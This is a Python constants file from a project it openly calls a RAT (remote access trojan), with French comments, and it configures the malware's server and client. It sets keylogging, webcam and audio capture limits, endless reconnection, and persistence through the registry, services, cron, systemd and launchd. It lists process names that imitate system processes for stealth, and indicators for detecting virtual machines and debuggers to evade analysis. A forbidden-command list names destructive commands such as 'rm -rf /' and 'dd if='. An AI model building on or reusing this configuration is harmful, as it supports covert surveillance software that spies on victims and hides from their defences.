"""
Constantes partagées pour le projet RAT
Définit les constantes utilisées par le serveur et le client
"""

# === CONFIGURATION RÉSEAU ===
DEFAULT_HOST = "0.0.0.0"
DEFAULT_PORT = 8888
DEFAULT_BUFFER_SIZE = 4096
MAX_MESSAGE_SIZE = 50 * 1024 * 1024  # 50MB
SOCKET_TIMEOUT = 30
CONNECTION_TIMEOUT = 10

# === PROTOCOLE ===
PROTOCOL_VERSION = "1.0"
MAGIC_HEADER = b'RAT1'
COMPRESSION_THRESHOLD = 1024

# === SÉCURITÉ ===
MAX_SESSIONS = 100
SESSION_TIMEOUT = 300  # 5 minutes
HEARTBEAT_INTERVAL = 30
MAX_RECONNECT_ATTEMPTS = -1  # Infini

# === LIMITATIONS DE SÉCURITÉ ===
MAX_FILE_SIZE = 100 * 1024 * 1024  # 100MB
MAX_SCREENSHOT_SIZE = 1920 * 1080
MAX_KEYLOG_DURATION = 600  # 10 minutes
MAX_WEBCAM_DURATION = 300  # 5 minutes
MAX_AUDIO_DURATION = 120  # 2 minutes
MAX_SEARCH_RESULTS = 100
MAX_SEARCH_DEPTH = 5

# === CODES D'ERREUR ===
ERROR_CODES = {
    'INVALID_COMMAND': 'INVALID_COMMAND',
    'PERMISSION_DENIED': 'PERMISSION_DENIED',
    'FILE_NOT_FOUND': 'FILE_NOT_FOUND',
    'CONNECTION_LOST': 'CONNECTION_LOST',
    'AUTHENTICATION_FAILED': 'AUTHENTICATION_FAILED',
    'TIMEOUT': 'TIMEOUT',
    'UNKNOWN_ERROR': 'UNKNOWN_ERROR'
}

# === EXTENSIONS DE FICHIERS AUTORISÉES ===
ALLOWED_DOWNLOAD_EXTENSIONS = {
    '.txt', '.log', '.cfg', '.conf', '.ini', '.xml', '.json',
    '.jpg', '.jpeg', '.png', '.gif', '.bmp',
    '.pdf', '.doc', '.docx', '.xls', '.xlsx',
    '.zip', '.rar', '.7z', '.tar', '.gz'
}

# === RÉPERTOIRES SENSIBLES ===
SENSITIVE_DIRECTORIES = {
    'windows': [
        'windows/system32', 'windows/syswow64', 'program files',
        'program files (x86)', 'programdata'
    ],
    'linux': [
        '/etc', '/usr/bin', '/usr/sbin', '/bin', '/sbin',
        '/root', '/var/log', '/proc', '/sys'
    ],
    'darwin': [
        '/system', '/usr/bin', '/usr/sbin', '/bin', '/sbin',
        '/library/system', '/var/log'
    ]
}

# === COMMANDES INTERDITES ===
FORBIDDEN_COMMANDS = {
    'windows': [
        'format', 'del /s', 'rd /s', 'rmdir /s', 'deltree',
        'shutdown /f', 'taskkill /f', 'net user', 'net localgroup',
        'reg delete', 'wmic process', 'powershell -enc'
    ],
    'linux': [
        'rm -rf /', 'rm -rf *', 'dd if=', 'mkfs', 'fdisk',
        'sudo rm', 'chmod 777', 'chown -R', 'kill -9',
        'killall', 'pkill', 'halt', 'reboot'
    ],
    'darwin': [
        'rm -rf /', 'rm -rf *', 'dd if=', 'diskutil',
        'sudo rm', 'chmod 777', 'chown -R', 'kill -9',
        'killall', 'halt', 'reboot'
    ]
}

# === CONFIGURATIONS AUDIO/VIDÉO ===
AUDIO_SAMPLE_RATE = 16000  # 16kHz
AUDIO_CHANNELS = 1  # Mono
AUDIO_SAMPLE_WIDTH = 2  # 16-bit

WEBCAM_MAX_RESOLUTION = (640, 480)
WEBCAM_FRAME_RATE = 5  # FPS
WEBCAM_MAX_FRAMES_BUFFER = 30

# === PATHS ET FICHIERS ===
DEFAULT_LOG_FILE = "rat.log"
DEFAULT_CONFIG_FILE = "config.json"
DEFAULT_SSL_CERT_DIR = "server/data/ssl"

# === PERSISTENCE ===
PERSISTENCE_METHODS = {
    'windows': ['registry', 'startup', 'service', 'scheduled_task'],
    'linux': ['systemd', 'cron', 'init.d', 'autostart'],
    'darwin': ['launchd', 'cron', 'login_items']
}

# === STEALTH MODE ===
STEALTH_PROCESS_NAMES = {
    'windows': ['svchost.exe', 'dwm.exe', 'explorer.exe', 'winlogon.exe'],
    'linux': ['systemd', 'kthreadd', 'dbus-daemon', 'NetworkManager'],
    'darwin': ['launchd', 'kernel_task', 'WindowServer', 'Dock']
}

# === DÉTECTION D'ENVIRONNEMENT ===
VM_INDICATORS = [
    'virtualbox', 'vmware', 'qemu', 'xen', 'hyperv',
    'parallels', 'virtual', 'sandbox'
]

DEBUGGER_INDICATORS = [
    'ollydbg', 'ida', 'x64dbg', 'windbg', 'gdb',
    'immunity', 'cheat engine'
]